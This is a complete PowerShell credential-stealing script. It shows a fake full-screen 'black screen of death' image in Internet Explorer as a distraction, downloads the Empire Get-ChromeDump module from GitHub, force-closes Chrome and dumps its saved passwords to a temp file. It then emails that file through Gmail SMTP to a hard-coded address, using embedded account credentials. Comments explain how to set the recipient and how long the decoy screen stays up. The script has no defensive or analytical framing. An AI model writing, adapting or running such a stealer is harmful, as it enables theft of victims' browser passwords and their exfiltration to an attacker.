start-job -scriptblock {C:\Progra~1\Intern~1\iexplore.exe -k https://upload.wikimedia.org/wikipedia/commons/e/e0/Win3x_Black_Screen_of_Death.gif} 1>$null
$url = "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ChromeDump.ps1"
$output = "$env:temp\file.psm1"

#create test email account in gmail and enter the credentials here
#WARNING: E-mail credentials might be exposed if the source code is found.
$Username = "GiveME1Taa@gmail.com";  
$Password = "1234576aa";
(New-Object System.Net.WebClient).DownloadFile($url,$output)
if(Get-Process -Name Chrome -ea SilentlyContinue)
{
Stop-Process -Force -Name Chrome
}
Import-Module $env:temp\file.psm1
Get-ChromeDump -OutFile $env:temp\dumped.txt  3>$null

function Send-ToEmail([string]$email, [string]$attachmentpath){

    $message = new-object Net.Mail.MailMessage;
    $message.From = "Endermanhunter07@gmail.com";
    $message.To.Add($email);
    $message.Subject = "Pass";
    $message.Body = "Pass:";
    $attachment = New-Object Net.Mail.Attachment($attachmentpath);
    $message.Attachments.Add($attachment);

    $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", "587");
    $smtp.EnableSSL = $true;
    $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
    $smtp.send($message);
    $attachment.Dispose();
 }
#Replace the to-address-email with the email address you want the password file sent to.
Send-ToEmail  -email "GiveME1Taa@gmail.com" -attachmentpath $env:temp\dumped.txt 2>$null;
#Change the seconds accordingly , It specifies how long the windows update should stay on screen
Start-Sleep -Seconds 10
Get-Process -Name iexplore | Stop-Process
